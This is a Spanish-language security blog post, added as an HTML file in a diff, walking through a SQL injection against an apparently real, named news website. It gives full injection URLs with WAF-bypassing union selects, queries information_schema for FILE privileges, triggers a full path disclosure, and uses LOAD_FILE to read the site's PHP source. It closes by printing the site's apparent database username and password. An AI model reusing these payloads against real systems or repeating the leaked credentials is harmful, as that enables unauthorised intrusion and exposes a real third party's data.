@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Full Source Disclosure Por SQLI - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by hdbreakerReseña:¿Full Source Disclosure? Full source disclosure, es una vulnerabilidad la cúal se basa en la descarga o visualización de archivos &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/11/full-source-disclosure-por-sqli/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Full Source Disclosure Por SQLI</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-11T16:38:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:38 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://www.wolkdirekt.com/images/600/112856/hinweisschild-fuer-den-brandschutz-fsd.jpg" height="400" width="400" /></div><div style="text-align: right;"><b>by hdbreaker</b></div><br /><b>Reseña:</b><br /><b>¿Full Source Disclosure? </b><br /><br />Full source disclosure, es una vulnerabilidad la cúal se  basa en la descarga o visualización de archivos del servidor web, con la cúal podemos  llegar a ver el respectivo codigo del archivo<b> </b><br /><br /><b>¿WAF?</b><br /><br />Un WAF (Web Application Firewall) es un dispositivo hardware o  software que permite proteger los servidores de aplicaciones web de  determinados ataques específicos en Internet. Se controlan las  transacciones al servidor web de nuestro negocio.<br />Básicamente nos permite evitar (entre otras) los siguientes ataques:<br /><b>Cross-site scripting</b> que consiste en la inclusión de código script malicioso en el cliente que consulta el servidor web.<br /><b>SQL injection</b> que consiste en introducir un código SQL que vulnere la Base de Datos de nuestro servidor.<br /><b>Denial-of-service</b> que consiste en que el servidor de aplicación sea incapaz de servir peticiones correctas de usuarios.<br />Hay 2 tipos de WAF: Los que se residen en la red (es decir son un  elemento más de la red) y los que se basan en el servidor de  aplicaciones (residen en el servidor).<br /><br /><b>¿SQL Injection?</b><br /><br />Se dice que existe o se produjo una <i>inyección SQL</i> cuando, de  alguna manera, se inserta o "inyecta" código SQL invasor dentro del  código SQL programado, a fin de alterar el funcionamiento normal del  programa y lograr así que se ejecute la porción de código "invasor"  incrustado, en la base de datos.<br /><br />En en esta entrada no tocaremos el tema desde cero, para los que no conozcan del tema pueden profundizar en los siguientes links:<br /><br /><a href="http://www.antrax-labs.org/2012/01/sql-injection-desde-cero.html">http://www.antrax-labs.org/2012/01/sql-injection-desde-cero.html</a><br /><a href="http://arthusu.blogspot.com.ar/2013/04/blind-sqli-boolean-based-mysql.html">http://arthusu.blogspot.com.ar/2013/04/blind-sqli-boolean-based-mysql.html </a><br /><a href="http://arthusu.blogspot.com.ar/2013/06/sqli-bypassenado-el-firewall-y-pasando.html">http://arthusu.blogspot.com.ar/2013/06/sqli-bypassenado-el-firewall-y-pasando.html</a><br /><br /><b>Comenzamos:</b><br /><b>&nbsp;</b> <br />En esta entrada analizaremos el siguiente sitio vulnerable a SQLI:<br /><br />http://www.lasemana.es/periodico/noticia.php?cod=34689<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i42.tinypic.com/256wx2w.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br />Luego de explotar el sqli y Bypassear el WAF:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i44.tinypic.com/b6c46d.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br /><br />Vector: <br /><br /><pre class="brush: sql">http://www.lasemana.es/periodico/noticia.php?cod=34689 /*!50000union*/ /*!50000select*/ 1,2,3,0x6864627265616b6572,version(),6,user(),8,@@datadir,10,11,12,13,14,15,16 limit 1,1-- -c<br /></pre><br />como podemos ver, la inyección es Union Based, y el WAF solo filtra union y select, ahora mi pregunta es si el usuario <br /><br />lasema@localhost<br /><br />Tiene privilegios File, nos fijamos de la siguiente manera:<br /><br />Dentro de information_schema existe una tabla llamada<br /><br />USER_PRIVILEGES,<br /><br />Dentro de esta tabla existe 2 campos que nos interesan:<br /><br />GRANTEE: Posee los nombre de usuario de la base de datos.<br />PRIVILEGE_TYPE: Tipo de privilegio que tiene el usuario.<br /><br />entonces la logica, nos dice que tenemos que formular algo como esto:<br /><br /><pre class="brush: sql">select * from information_schema.USER_PRIVILEGES;<br /></pre><br />pero esto nos devolvería todos el contenido de la tabla y<br />nosotros solo queremos saber que permisos tiene: "lasema@localhost"&nbsp;&nbsp; y especificamente si tiene el permiso FILE, a mi se me ocurre algo como esto:<br /><br /><pre class="brush: sql">SELECT GRANTEE FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE PRIVILEGE_TYPE="FILE";<br /></pre><br />esto nos mostraría todos los usuarios que tienen permisos FILE en la base de datos, entre eso buscaremos si se encuentra "lasema@localhost"<br /><br />entonces acoplamos nuestra query sql a nuestra sentencia SQLI quedando de esta forma:<br /><br /><pre class="brush: sql">http://www.lasemana.es/periodico/noticia.php?cod=34689 /*!50000union*/ /*!50000select*/ 1,2,3,4,version(),6,user(),group_concat(GRANTEE),@@datadir,10,11,12,13,14,15,16 from information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE=0x46494c45 limit 1,1-- -c<br /></pre><br />donde 0x46494c45 es el hexadecimal de FILE (Esto lo hacemos ya que no podemos encapsular FILE entre ' ' o " ")<br /><br />vemos que nos muestra lo siguiente:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-Nls0FH8HqlI/VLMZXQ6cy4I/AAAAAAAAAE0/WzRanERLwdQ/s1600/2gvr9s9.jpg.png" height="359" onclick="zoomToggle('640px','359px','100%','100%',this);" width="640" /></div><br /><br />podemos ver que al usar group_concat, la injection no logra ser completamente visible desde la interface de usuario, por lo que nos aventuraremos a ver el Source Code y buscando la palabra root nos posicionaremos sobre la linea de la injection:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-yUR84bfXmF8/VLMZlxfA5VI/AAAAAAAAAE8/yq7b1sT4nBI/s1600/333.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br /><br />Como podemos observar "lasema" aparece en esa linea, por lo que podemos determinar que el usuario "lasema@localhost" tiene permisos de FILE y podemos realizar lectura de archivo.<br /><br />Para esto implementaremos nuestro querido:<br /><br /><pre class="brush: bash">LOAD_FILE("RUTA/ARCHIVO")<br /></pre><br />Lo primero que debemos lograr es un Full Patch Disclosure para obtener donde estamos parados, para esto vamos a intentar generar un error con caracteres no validos para la web:<br /><br />Para profundizar sobre FPD:<br /><a href="http://securityec.com/que-full-path-disclosure-fpdes-una-vulnerabilidad/">http://securityec.com/que-full-path-disclosure-fpdes-una-vulnerabilidad/</a><br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-i_OxQC_lkLA/VLMaC27ylnI/AAAAAAAAAFE/xqJcHOKcoRI/s1600/444.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br /><br />podemos apreciar:<br /><br /><pre class="brush: bash">Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in <b>/var/www/docs/lasemana.es/periodico/noticia.php</b> on line 8<br /></pre><br />donde mysql nos vuelve a dar una mano y nos revela nuestro patch:<br />/var/www/docs/lasemana.es/periodico/noticia.php<br /><br />Recapitulando:<br /><br />Gracias a nuestro usuario "lasema@localhost" que posee privilegios de FILE podremos realizar LOAD_FILE(RUTA) donde RUTA el path de nuestro FPD!<br /><br />Manos a la Obra:<br /><br />Nuestra SQLI quedaría de la siguiente forma:<br /><br /><pre class="brush: sql">http://www.lasemana.es/periodico/noticia.php?cod=34689 /*!50000union*/ /*!50000select*/ 1,2,3,4,version(),6,user(),LOAD_FILE(0x2f7661722f7777772f646f63732f6c6173656d616e612e65732f706572696f6469636f2f6e6f74696369612e706870),@@datadir,10,11,12,13,14,15,16 limit 1,1-- -c<br /><br /></pre>Donde  <br /><pre class="brush: bash">0x2f7661722f7777772f646f63732f6c6173656d616e612e65732f706572696f6469636f2f6e6f74696369612e706870 <br /></pre>es el hexadeciman de: /var/www/docs/lasemana.es/periodico/noticia.php (Ruta de nuestro Path Disclouse)<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-m2rWoNJiCnI/VLMa5URnw4I/AAAAAAAAAFQ/m05cwA0HenE/s1600/555.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br /><br />visitamos el código fuente de la web:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-Igv4wvyZwUM/VLMbKaNRANI/AAAAAAAAAFY/4qHE6QfUjLo/s1600/6666.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br /><br />y vemos muy claramente, el usuario y password de la base de datos:<br /><br /><pre class="brush: php">$usuario = "lasema";<br /><br />$contraseña = "arcaliso";<br /><br />$conexion = mysql_connect("localhost", "$usuario","$contraseña") or mail ("sms@alisys.net","607720916","Se ha caido el Servidor","From: SOPORTE &lt;soporte@lasemana.es&gt;");<br /></pre><br /><div style="text-align: right;"><br /><b>Happy Hacking!</b></div></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-11T16:38:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:38 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/11/full-source-disclosure-por-sqli/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/11/full-source-disclosure-por-sqli/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/11/backdoor-via-inyeccion/" title="Previous Post: Backdoor via Inyeccion">&laquo; Backdoor via Inyeccion</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/11/explotar-lfi-y-subir-shell-explotando/" title="Next Post: Explotar LFI /proc/self/environ">Explotar LFI /proc/self/environ &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
